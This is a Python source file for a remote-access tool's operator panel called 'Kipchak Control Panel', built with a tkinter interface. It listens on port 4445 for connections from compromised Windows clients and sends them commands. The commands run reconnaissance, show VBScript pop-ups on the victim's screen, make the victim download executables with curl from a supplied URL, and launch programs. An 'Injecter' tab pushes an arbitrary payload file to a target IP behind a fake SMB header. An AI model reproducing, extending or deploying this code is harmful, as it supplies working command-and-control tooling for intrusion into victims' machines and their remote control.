import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
from tkinter import ttk
import socket
import threading
import os


theme_bg = "#0D0D0D"            
theme_fg = "#E0E0E0"            
theme_accent = "#00ADB5"       
theme_highlight = "#F8B400"    
theme_output_bg = "#1A1A1A"     
theme_button_bg = "#222831"
theme_button_hover = "#393E46"
font_family = "Consolas"
font_normal = (font_family, 11)
font_bold = (font_family, 12, "bold")


connections = []
selected_client = None
server = None

def log(message):
    output_area.config(state="normal")
    output_area.insert(tk.END, message + "\n")
    output_area.see(tk.END)
    output_area.config(state="disabled")

def log_smb(message):
    smb_output.config(state="normal")
    smb_output.insert(tk.END, message + "\n")
    smb_output.see(tk.END)
    smb_output.config(state="disabled")

def update_connections():
    for row in connection_tree.get_children():
        connection_tree.delete(row)
    for i, conn in enumerate(connections):
        client_ip = conn.getpeername()[0]
        connection_tree.insert("", tk.END, values=(f"Client {i+1}", client_ip, "Connected"))

def on_client_click(event):
    global selected_client
    selected_item = connection_tree.focus()
    if selected_item:
        client_index = connection_tree.index(selected_item)
        if 0 <= client_index < len(connections):
            selected_client = connections[client_index]
            log(f"[+] Selected Client: Client {client_index + 1}")

def send_command_to_client(client, command):
    try:
        client.send(command.encode())
        response = client.recv(4096).decode(errors='ignore')
        log(response if response else "[!] No response from Client")
    except Exception as e:
        log(f"[!] Error sending command: {e}")

def start_listener():
    global server
    host = "0.0.0.0"
    port = 4445
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(5)
        log(f"[+] Listener started on {host}:{port}")
        threading.Thread(target=accept_connections, daemon=True).start()
    except Exception as e:
        log(f"[!] Error starting listener: {e}")

def accept_connections():
    while True:
        try:
            client, addr = server.accept()
            connections.append(client)
            log(f"[+] Connection from {addr} established!")
            update_connections()
        except Exception as e:
            log(f"[!] Connection failed: {e}")
            break

def stop_listener():
    global server
    try:
        for conn in connections:
            conn.close()
        connections.clear()
        if server:
            server.close()
        log("[-] Listener stopped")
        update_connections()
    except Exception as e:
        log(f"[!] Error while stopping: {e}")

def send_message():
    if selected_client:
        message = message_entry.get()
        if message:
            command = f'echo MsgBox "{message.replace("\"", "\"\"")}" > %TEMP%\\message.vbs && start "" %TEMP%\\message.vbs'
            send_command_to_client(selected_client, command)
        else:
            log("[!] No message entered!")
    else:
        log("[!] No client selected!")

def wget_download():
    if selected_client:
        url = url_entry.get()
        if url:
            command = f'curl -o %USERPROFILE%\\Desktop\\download.exe {url}'
            send_command_to_client(selected_client, command)
        else:
            log("[!] No URL entered!")
    else:
        log("[!] No client selected!")

def execute_command(command):
    if selected_client:
        send_command_to_client(selected_client, command)
    else:
        log("[!] No client selected!")

def open_advanced_window():
    if not selected_client:
        log("[!] Please select a client first!")
        return

    adv_window = tk.Toplevel(root)
    adv_window.title("More Tools 🛠")
    adv_window.geometry("400x250")
    adv_window.configure(bg=theme_bg)

    def execute_exe():
        exe_path = filedialog.askopenfilename(title="Select an .exe", filetypes=[("Executable Files", "*.exe")])
        if exe_path:
            remote_command = f'start "" "{exe_path}"'
            send_command_to_client(selected_client, remote_command)

    label = tk.Label(adv_window, text="Execute Remote Tools", bg=theme_bg, fg=theme_highlight, font=font_bold)
    label.pack(pady=20)
    button = tk.Button(adv_window, text="Execute .exe", bg=theme_button_bg, fg=theme_fg, activebackground=theme_button_hover, activeforeground=theme_highlight, font=font_normal, command=execute_exe)
    button.pack(pady=20)

def start_smb_crasher():
    ip = smb_ip_entry.get()
    port = smb_port_entry.get()
    payload = payload_path_entry.get()

    if not ip or not port.isdigit() or not payload:
        messagebox.showerror("Error", "Please fill all fields correctly!")
        return

    port = int(port)

    def smb_server():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))  
            log_smb(f"[*] Connected to {ip}:{port}")

           
            dummy_payload = b"\x00\x00\x00\x90" + b"FAKESMB" * 10  
            s.send(dummy_payload)
            log_smb(f"[+] Dummy-Payload sent to {ip}:{port}")

            
            with open(payload, "rb") as f:
                payload_data = f.read()
                s.send(payload_data)  
            log_smb(f"[+] Payload sent to {ip}:{port}")

            s.close()
            
            accept_connections()  
        except Exception as e:
            log_smb(f"[!] Error: {e}")

    threading.Thread(target=smb_server, daemon=True).start()

def select_payload():
    filepath = filedialog.askopenfilename(title="Select Payload", filetypes=[("Executable", "*.exe"), ("All Files", "*.*")])
    if filepath:
        payload_path_entry.delete(0, tk.END)
        payload_path_entry.insert(0, filepath)


root = tk.Tk()
root.title("⚡ Kipchak Control Panel ⚡")
root.geometry("1200x850")
root.configure(bg=theme_bg)
try:
    root.iconbitmap("kip2.ico")
except:
    pass

style = ttk.Style()
style.theme_use("clam")
style.configure(".", background=theme_bg, foreground=theme_fg, fieldbackground=theme_output_bg, bordercolor=theme_accent)

notebook = ttk.Notebook(root)
notebook.pack(fill="both", expand=True, padx=10, pady=10)


manager_frame = ttk.Frame(notebook)
manager_frame.pack(fill="both", expand=True)
notebook.add(manager_frame, text="Payload Manager")

left_frame = ttk.Frame(manager_frame, padding=10)
left_frame.pack(side=tk.LEFT, fill="both", expand=True)

right_frame = ttk.Frame(manager_frame, padding=10)
right_frame.pack(side=tk.RIGHT, fill="y")


tk.Label(left_frame, text="Connected Clients", bg=theme_bg, fg=theme_highlight, font=font_bold).pack(pady=5)
connection_tree = ttk.Treeview(left_frame, columns=("Client", "IP", "Status"), show="headings", height=10)
connection_tree.heading("Client", text="Client")
connection_tree.heading("IP", text="IP")
connection_tree.heading("Status", text="Status")
connection_tree.pack(fill="both", expand=True)
connection_tree.bind("<ButtonRelease-1>", on_client_click)

tk.Label(left_frame, text="📌 Output:", bg=theme_bg, fg=theme_highlight, font=font_bold).pack(pady=5)
output_area = scrolledtext.ScrolledText(left_frame, height=15, bg=theme_output_bg, fg=theme_fg, font=font_normal)
output_area.pack(fill="both", expand=True, pady=5)
output_area.config(state="disabled")


def create_command_button(text, cmd):
    b = tk.Button(right_frame, text=text, bg=theme_button_bg, fg=theme_fg, font=font_normal, activebackground=theme_button_hover, activeforeground=theme_highlight, command=lambda: execute_command(cmd))
    b.pack(fill="x", pady=4)

tk.Button(right_frame, text="🚀 Start Listener", command=start_listener, bg=theme_button_bg, fg=theme_fg, font=font_bold).pack(fill="x", pady=5)
tk.Button(right_frame, text="🛑 Stop Listener", command=stop_listener, bg=theme_button_bg, fg=theme_fg, font=font_bold).pack(fill="x", pady=5)

tk.Label(right_frame, text="Basic Commands:", bg=theme_bg, fg=theme_highlight, font=font_bold).pack(pady=8)
for cmd in ["whoami", "ipconfig", "dir", "tasklist", "systeminfo", "hostname"]:
    create_command_button(cmd, cmd)

tk.Label(right_frame, text="💬 Send message:", bg=theme_bg, fg=theme_highlight).pack(pady=5)
message_entry = ttk.Entry(right_frame)
message_entry.pack(fill="x", pady=4)
tk.Button(right_frame, text="📩 Send", command=send_message, bg=theme_button_bg, fg=theme_fg).pack(fill="x", pady=4)

tk.Label(right_frame, text="🌐 Download Exe:", bg=theme_bg, fg=theme_highlight).pack(pady=5)
url_entry = ttk.Entry(right_frame)
url_entry.pack(fill="x", pady=4)
tk.Button(right_frame, text="⬇️ Download Exe", command=wget_download, bg=theme_button_bg, fg=theme_fg).pack(fill="x", pady=4)


smb_frame = ttk.Frame(notebook)
smb_frame.pack(fill="both", expand=True)
notebook.add(smb_frame, text="Injecter")

for label_text in ["Target IP:", "Port:", "Payload used for injecting:"]:
    tk.Label(smb_frame, text=label_text, bg=theme_bg, fg=theme_highlight, font=font_normal).pack(pady=3)

smb_ip_entry = ttk.Entry(smb_frame, width=40)
smb_ip_entry.pack(pady=3)
smb_port_entry = ttk.Entry(smb_frame, width=40)
smb_port_entry.pack(pady=3)
payload_path_entry = ttk.Entry(smb_frame, width=50)
payload_path_entry.pack(pady=3)

tk.Button(smb_frame, text="Browse", command=select_payload, bg=theme_button_bg, fg=theme_fg).pack(pady=4)
tk.Button(smb_frame, text="Start Injection", command=start_smb_crasher, bg=theme_button_bg, fg=theme_fg, font=font_bold).pack(pady=8)

smb_output = scrolledtext.ScrolledText(smb_frame, height=15, bg=theme_output_bg, fg=theme_fg, font=font_normal)
smb_output.pack(fill="both", expand=True, pady=5)

root.mainloop()
